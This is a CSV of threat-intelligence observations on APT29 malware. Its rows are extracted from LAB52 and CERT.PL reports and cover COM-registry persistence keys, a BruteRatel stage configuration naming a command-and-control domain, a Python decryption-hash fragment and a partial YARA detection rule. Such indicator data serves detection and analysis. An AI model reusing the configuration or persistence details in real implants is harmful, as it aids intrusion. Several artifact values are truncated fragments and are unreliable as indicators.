1.0.0,actor--apt29,artifact--sha256:edbb56849e9cef6dba0967a6e3971825c7502ceae601dff68c4784f021f97cf5,observation--sha256:94bbf280dd174783005d688881d14dd3e74bc10f198ac6c3a5277457c89418c0,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{d2b68891-a0c1-4fbc-2f7c-,HKU\<SID>\SOFTWARE\Classes\CLSID\{d2b68891-a0c1-4fbc-2f7c-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:f0331e1119dee08fa80c7164f4e7912f1019cc1495e76d50fa2a6dbf485dc3ac,observation--sha256:1801381acc624d9a07b6d5f30c51549a1de85dccebd920cf953795b010a80470,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{fb-,HKU\<SID>\SOFTWARE\Classes\CLSID\{fb-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:ee72725437889b7c9090187ee8f795e83ca2b6abbaa0c87f8ac94b5f2d4aff5e,observation--sha256:443695f8b5eb5b6e76f0583bcca53a10c51693b4327b5fea21dc297f33f128ae,sample-string,0|20|22|||||eyJ0eXBlIjogInJlcXVlc3QiLCAiaWQiOiI3MTI1LTgxNzMtOTQ2MS00NTIxIiwiZGF0YS,0|20|22|||||eyJ0eXBlIjogInJlcXVlc3QiLCAiaWQiOiI3MTI1LTgxNzMtOTQ2MS00NTIxIiwiZGF0YS,candidate,2022-07-20T00:00:00Z,day,known,same-record,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 18/24 According to one of the patch notes17, this hardcoded password was used in BruteRatel versions prior to 1.1 to decrypt the stage configuration. The adversary probably uses BruteRatel version 1.0.7 which was leaked on various forums. Presented below is an extracted stage configuration string: 0|20|22|||||eyJ0eXBlIjogInJlcXVlc3QiLCAiaWQiOiI3MTI1LTgxNzMtOTQ2MS00NTIxIiwiZGF0YS I6Ig==|In0=|0|1|badriatimimi.com|443|Mozilla/5.0 (Windows NT",
1.0.0,actor--apt29,artifact--sha256:cb4c0e8b85598899f165518b9f2d712020206cee50323e56185ce921425df343,observation--sha256:25b5907ddbf322a6e962c4d123825a77a5c0d4b7fa19591992a5260c24d7bf3b,sample-string,int) -> int:,int) -> int:,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 14/36 4th Stage – Shellcode – Dropper Loader The 4th stage of the QUARTERRIG execution chain is another DLL loader shellcode. It is responsible for loading embedded DLL that facilitates downloading of the final payload from the C2 server. The 4th stage is also the most obfuscated stage of the execution. Aside from previously observed obfuscation techniques, it employs a large number of opaque predicates to hinder analysis. Additional OPSE",
1.0.0,actor--apt29,artifact--sha256:cb4c0e8b85598899f165518b9f2d712020206cee50323e56185ce921425df343,observation--sha256:0edce813a74cee079d68e99b55801fbb804d2d7ce421ec79f83b6494674a428e,sample-string,int) -> int:,int) -> int:,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 17/36 To ease static analysis and help with payload extraction, the decryption function was reimplemented using Python: def hash_round(data: bytes, magic: int) -> int: ret_hash_a = UInt32(magic & 0xffffffff) ret_hash_b = UInt32(magic >> 32) o, p, r, s = [uint32(x) for x in chunks(data, 4)] for iterator in range(27): ret_hash_a = (ret_hash_b + ret_hash_a.ror(8)) ^ o ret_hash_b = ret_hash_b.rol(3) ^ ret_hash_a v = s s = (p.ror(8) + o) ^ UIn",
1.0.0,actor--apt29,artifact--sha256:88c0b6ebc20217a12a30f0208bbf9c700a62d12132ff0aaf05bca745fd45d640,observation--sha256:584d06516531006fbc481b5a496838fb220c374db16797349fc7938a41b58bd9,sample-string,{48 39 D0 74 19 48 89 C1 4D 89 C2 83 E1 07 48 C1 E1 03 49 D3 EA 45 30 14 01 48 FF C0 EB E2},{48 39 D0 74 19 48 89 C1 4D 89 C2 83 E1 07 48 C1 E1 03 49 D3 EA 45 30 14 01 48 FF C0 EB E2},candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 19/24 YARA Rule A rule that can be used to scan for SNOWYAMBER: rule APT29_SNOWYAMBER { meta: description = ""Detects APT29-linked SNOWYAMBER dropper"" strings: // Payload decryption loop // Custom algorithm based on XOR $op_decrypt_payload = {49 8B 45 08 48 ?? ?? ?? 48 39 ?? 76 2B 48 89 C8 31 D2 4C 8B 4C 24 ?? 48 F7 74 24 ?? 49 8B 45 00 41 8A 14 11 32 54 08 10 89 C8 41 0F AF C0 31 C2 88 14 0B 48 FF C1} // Decryption routine generated by Ob",
